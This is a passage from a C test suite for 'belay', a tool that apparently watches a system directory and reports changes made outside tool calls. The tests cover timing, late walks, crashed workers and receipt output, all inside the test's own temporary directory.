    ASSERT_EQ_INT(3, (int)count(g_out, "\n"));
    ASSERT_TRUE(strstr(g_out, "... the rest: belay watch receipt without --max-lines\n") != NULL);
    REQUIRE(belay("watch", "receipt", "--system-root", g_tree, "--path") == 0);
    ASSERT_TRUE(strstr(g_out, "/receipt.txt\n") != NULL);
}

static double g_stall_s;
static bool g_die;
static void stall_walking(const char *stage) {
    if (strcmp(stage, "walking") != 0) return;
    if (g_die) _exit(9);
    struct timespec ts = { (time_t)g_stall_s, (long)((g_stall_s - (double)(time_t)g_stall_s) * 1e9) };
    nanosleep(&ts, NULL);
}

/* The walker a late step left: reaped, so its walk is over. */
static void walker_done(void) {
    int status;
    while (waitpid(-1, &status, 0) > 0) {}
}

/* WS-3a to WS-3c: a walk past the limit is not killed; the step says so and
 * exits 0; a step meanwhile says the walk is in progress; the next step
 * reports it, `since` the checkpoint before it, then its own; each change
 * once; and the receipt counts the steps reported late. */
TEST(a_walk_past_the_limit_is_reported_by_the_next_step) {
    fresh();
    REQUIRE(sys("start") == 0);
    sh("cd '%s' && printf 'A\\n' > etc/a-file", g_tree);
    watch_stage_hook = stall_walking;
    g_stall_s = 2.5;
    REQUIRE_MSG(step_d("1") == 0, "%s", g_out);
    watch_stage_hook = NULL;
    ASSERT_EQ_STR(g_root ? "belay: walking (no kernel record): not finished in 1 s; what changed will be in the next line\n"
                         : "belay: walking (not root): not finished in 1 s; what changed will be in the next line\n", g_out);
    REQUIRE_MSG(step() == 0, "%s", g_out);                                  /* WS-3b */
    ASSERT_TRUE(strstr(g_out, "belay: walk in progress since ") == g_out);
    ASSERT_TRUE(strstr(g_out, g_root ? " (no kernel record)\n" : " (not root)\n") != NULL);
    walker_done();
    sh("cd '%s' && printf 'B\\n' > etc/b-file", g_tree);
    REQUIRE_MSG(step() == 0, "%s", g_out);
    ASSERT_EQ_INT(2, (int)count(g_out, "\n"));
    ASSERT_TRUE(strstr(g_out, "belay: since ") == g_out);
    ASSERT_TRUE(strstr(g_out, ": outside tool calls: 1 change: etc/a-file added\nbelay: outside tool calls: 1 change: etc/b-file added\n") != NULL);
    /* late again, with a walk waiting: the late line, then the walking line */
    sh("cd '%s' && printf 'C\\n' > etc/c-file", g_tree);
    watch_stage_hook = stall_walking;
    REQUIRE(step_d("1") == 0);
    walker_done();
    sh("cd '%s' && printf 'D\\n' > etc/d-file", g_tree);
    REQUIRE(step_d("1") == 0);
    watch_stage_hook = NULL;
    ASSERT_TRUE(strstr(g_out, "belay: since ") == g_out && strstr(g_out, "etc/c-file added\nbelay: walking (") != NULL);
    ASSERT_TRUE(strstr(g_out, "d-file") == NULL);
    walker_done();
    REQUIRE(step() == 0);
    ASSERT_TRUE(strstr(g_out, "belay: since ") == g_out && strstr(g_out, "etc/d-file added\n") != NULL);
    ASSERT_EQ_INT(1, (int)count(g_out, "\n"));
    REQUIRE(step() == 0);
    ASSERT_EQ_STR("", g_out);
    /* WS-3c */
    REQUIRE_MSG(sys("receipt") == 0, "%s", g_err);
    ASSERT_TRUE(strstr(g_out, "; 3 steps reported late (walks of 3 s, 3 s, 3 s)\n") != NULL);
    ASSERT_EQ_INT(1, (int)count(g_out, "etc/a-file"));
}

static void stall_matching(const char *stage) {
    if (strcmp(stage, "matching") != 0) return;
    struct timespec ts = { (time_t)g_stall_s, (long)((g_stall_s - (double)(time_t)g_stall_s) * 1e9) };
    nanosleep(&ts, NULL);
}

/* WS-3a: what follows the walk is the worker's too. A diff and a match
 * longer than the limit, step after step: each step says `walking`, and the
 * next prints the last one's line from the record, never diffing it again
 * within its own limit; no step is killed and the watch is never stopped
 * (TM-3 does not apply). Measured on a 22.04 runner, where the diff of two
 * walks alone took 40 to 57 s. */
TEST(a_slow_match_after_the_walk_is_the_workers_and_never_stops_the_watch) {
    fresh();
    REQUIRE(sys("start") == 0);
    watch_stage_hook = stall_matching;
    g_stall_s = 1.5;
    for (int i = 0; i < 5; i++) {
        sh("cd '%s' && printf 'x\\n' > etc/f%d", g_tree, i);
        const int rc = step_d("1");
        walker_done();
        ASSERT_EQ_INT(0, rc);
        ASSERT_TRUE(strstr(g_out, "could not record") == NULL && strstr(g_out, "not recording") == NULL);
        ASSERT_TRUE(strstr(g_out, "belay: walking (") != NULL);
        if (i > 0) {
            char want[64];
            snprintf(want, sizeof want, ": outside tool calls: 1 change: etc/f%d added\n", i - 1);
            ASSERT_TRUE(strstr(g_out, "belay: since ") == g_out && strstr(g_out, want) != NULL);
        }
    }
    watch_stage_hook = NULL;
    REQUIRE_MSG(step() == 0, "%s", g_out);
    ASSERT_TRUE(strstr(g_out, "belay: since ") == g_out && strstr(g_out, "etc/f4 added\n") != NULL);
    ASSERT_EQ_INT(1, (int)count(g_out, "\n"));
    REQUIRE(step() == 0);
    ASSERT_EQ_STR("", g_out);
    REQUIRE_MSG(sys("receipt") == 0, "%s", g_err);
    /* WS-3c: each from its walk's start to its record, never 0 s; three, then a count */
    const char *late = strstr(g_out, "; 5 steps reported late (walks of ");
    ASSERT_TRUE(late != NULL && strstr(late, " and 2 more)\n") != NULL && strstr(late, " 0 s") == NULL);
    for (int i = 0; i < 5; i++) {
        char f[16];
        snprintf(f, sizeof f, "etc/f%d", i);
        ASSERT_EQ_INT(1, (int)count(g_out, f));
    }
}

/* WS-3b: a worker that died leaves a lock nobody holds; the next step says
 * the last walk did not finish, and walks. */
TEST(a_walk_whose_worker_died_is_said_and_walked_again) {
    fresh();
    REQUIRE(step() == 0);
    sh("cd '%s' && printf 'A\\n' > etc/a-file", g_tree);
    watch_stage_hook = stall_walking;
    g_die = true;
    ASSERT_EQ_INT(4, step_d("1"));
    g_die = false;
    watch_stage_hook = NULL;
    ASSERT_TRUE(strstr(g_out, "belay stopped unexpectedly while walking") != NULL);
    REQUIRE_MSG(step() == 0, "%s", g_out);
    ASSERT_EQ_STR("belay: " RED " the last walk did not finish\nbelay: outside tool calls: 1 change: etc/a-file added\n", g_out);
}

/* WS-3: start, receipt and stop have no time limit, and say they are still at it. */
TEST(receipt_has_no_limit_and_says_so_every_period) {
    fresh();
    REQUIRE(sys("start") == 0);
    watch_stage_hook = stall_walking;
    g_stall_s = 1.3;
    watch_progress_ms = 500;
    REQUIRE_MSG(sys("receipt") == 0, "%s", g_err);
    watch_progress_ms = 10000;
    watch_stage_hook = NULL;
    ASSERT_TRUE(strstr(g_err, "belay: still walking (") != NULL);
    ASSERT_TRUE(strstr(g_out, "\nend state: by a walk at ") != NULL);
}

int main(void) {
    snprintf(g_dir, sizeof g_dir, "/tmp/belay_wsys_%d_%ld", (int)getpid(), (long)time(NULL));
    snprintf(g_tree, sizeof g_tree, "%s/tree", g_dir);
    snprintf(g_state, sizeof g_state, "%s/state", g_dir);
    umask(022);
    mkdir(g_dir, 0700);
    setenv("BELAY_STATE_DIR", g_state, 1);
    g_root = geteuid() == 0;
    RUN(start_opens_stop_closes_and_a_second_start_is_refused);
    RUN(a_step_flags_and_notes_by_the_system_list);
    RUN(a_record_that_says_only_a_side_was_not_read_is_no_change);
    RUN(a_file_that_no_longer_interprets_is_flagged);
    RUN(a_sudoers_sshkeys_or_user_unit_that_no_longer_interprets_is_flagged);
    RUN(listeners_and_services_by_their_executables_owner);
    RUN(patterns_lists_the_roots_the_homes_left_out_and_the_list);
    RUN(the_receipt_is_in_sections_in_order);
    RUN(a_walk_past_the_limit_is_reported_by_the_next_step);
    RUN(a_slow_match_after_the_walk_is_the_workers_and_never_stops_the_watch);
    RUN(a_walk_whose_worker_died_is_said_and_walked_again);
    RUN(receipt_has_no_limit_and_says_so_every_period);
    sh("chmod -R u+rwx '%s' 2>/dev/null; rm -rf '%s'", g_dir, g_dir);
    free(g_out);
    free(g_err);
    return belay_test_report();
}
